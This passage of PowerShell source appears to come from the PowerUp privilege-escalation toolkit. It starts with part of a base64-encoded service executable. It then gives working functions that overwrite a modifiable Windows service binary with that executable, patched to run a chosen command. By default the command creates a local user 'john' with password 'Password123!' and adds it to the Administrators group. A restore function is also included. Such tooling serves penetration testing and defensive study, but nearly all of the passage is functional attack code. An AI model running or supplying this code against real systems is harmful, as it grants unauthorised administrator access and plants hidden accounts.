CAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAAA9jAG0AZAAuAGUAeABlAABwlQEkfW6TS5S/gwmLKZ5MAAiwP19/EdUKOgi3elxWGTTgiQMGEg0EIAEBAgMgAAEFIAEBHQ4DAAABBCABAQ4FIAEBEUkEIAEBCAMgAA4GAAISYQ4OBAABAQgDBwEOBgABAR0SBQgHAh0SBR0SBQwBAAdVcGRhdGVyAAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDE1AAApAQAkN2NhMWIzMmEtOWMzNy00MTViLWJkOWYtZGRmNDE5OWUxNmVjAAAMAQAHMS4wLjAuMAAAZQEAKS5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC4wLFByb2ZpbGU9Q2xpZW50AQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZR8uTkVUIEZyYW1ld29yayA0IENsaWVudCBQcm9maWxlCAEAAgAAAAAACAEACAAAAAAAH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"
        [Byte[]] $Binary = [Byte[]][Convert]::FromBase64String($B64Binary)

        if ($PSBoundParameters['Command']) {
            $ServiceCommand = $Command
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }

    PROCESS {

        $TargetService = Get-Service -Name $Name

        # get the unicode byte conversions of all arguments
        $Enc = [System.Text.Encoding]::Unicode
        $ServiceNameBytes = $Enc.GetBytes($TargetService.Name)
        $CommandBytes = $Enc.GetBytes($ServiceCommand)

        # patch all values in to their appropriate locations
        for ($i=0; $i -lt ($ServiceNameBytes.Length); $i++) {
            # service name offset = 2458
            $Binary[$i+2458] = $ServiceNameBytes[$i]
        }
        for ($i=0; $i -lt ($CommandBytes.Length); $i++) {
            # cmd offset = 2535
            $Binary[$i+2535] = $CommandBytes[$i]
        }

        Set-Content -Value $Binary -Encoding Byte -Path $Path -Force -ErrorAction Stop

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $TargetService.Name
        $Out | Add-Member Noteproperty 'Path' $Path
        $Out | Add-Member Noteproperty 'Command' $ServiceCommand
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary')
        $Out
    }
}


function Install-ServiceBinary {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingUserNameAndPassWordParams', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerUp.ServiceBinary.Installed')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [String]
        $UserName = 'john',

        [String]
        $Password = 'Password123!',

        [String]
        $LocalGroup = 'Administrators',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [String]
        [ValidateNotNullOrEmpty()]
        $Command
    )

    BEGIN {
        if ($PSBoundParameters['Command']) {
            $ServiceCommand = $Command
        }
        else {
            if ($PSBoundParameters['Credential']) {
                $UserNameToAdd = $Credential.UserName
                $PasswordToAdd = $Credential.GetNetworkCredential().Password
            }
            else {
                $UserNameToAdd = $UserName
                $PasswordToAdd = $Password
            }

            if ($UserNameToAdd.Contains('\')) {
                # only adding a domain user to the local group, no user creation
                $ServiceCommand = "net localgroup $LocalGroup $UserNameToAdd /add"
            }
            else {
                # create a local user and add it to the local specified group
                $ServiceCommand = "net user $UserNameToAdd $PasswordToAdd /add && timeout /t 5 && net localgroup $LocalGroup $UserNameToAdd /add"
            }
        }
    }

    PROCESS {
        $TargetService = Get-Service -Name $Name -ErrorAction Stop
        $ServiceDetails = $TargetService | Get-ServiceDetail
        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -Literal

        if (-not $ModifiableFiles) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $BackupPath = "$($ServicePath).bak"

        Write-Verbose "Backing up '$ServicePath' to '$BackupPath'"

        try {
            Copy-Item -Path $ServicePath -Destination $BackupPath -Force
        }
        catch {
            Write-Warning "Error backing up '$ServicePath' : $_"
        }

        $Result = Write-ServiceBinary -Name $ServiceDetails.Name -Command $ServiceCommand -Path $ServicePath
        $Result | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Result.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary.Installed')
        $Result
    }
}


function Restore-ServiceBinary {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.ServiceBinary.Restored')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ServiceName')]
        [String]
        [ValidateNotNullOrEmpty()]
        $Name,

        [Parameter(Position = 1)]
        [ValidateScript({Test-Path -Path $_ })]
        [String]
        $BackupPath
    )

    PROCESS {
        $TargetService = Get-Service -Name $Name -ErrorAction Stop
        $ServiceDetails = $TargetService | Get-ServiceDetail
        $ModifiableFiles = $ServiceDetails.PathName | Get-ModifiablePath -Literal

        if (-not $ModifiableFiles) {
            throw "Service binary '$($ServiceDetails.PathName)' for service $($ServiceDetails.Name) not modifiable by the current user."
        }

        $ServicePath = $ModifiableFiles | Select-Object -First 1 | Select-Object -ExpandProperty ModifiablePath
        $BackupPath = "$($ServicePath).bak"

        Copy-Item -Path $BackupPath -Destination $ServicePath -Force
        Remove-Item -Path $BackupPath -Force

        $Out = New-Object PSObject
        $Out | Add-Member Noteproperty 'ServiceName' $ServiceDetails.Name
        $Out | Add-Member Noteproperty 'ServicePath' $ServicePath
        $Out | Add-Member Noteproperty 'BackupPath' $BackupPath
        $Out.PSObject.TypeNames.Insert(0, 'PowerUp.ServiceBinary.Restored')
        $Out
    }
}



function Find-ProcessDLLHijack {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerUp.HijackableDLL.Process')]
    [CmdletBinding()]
    Param(
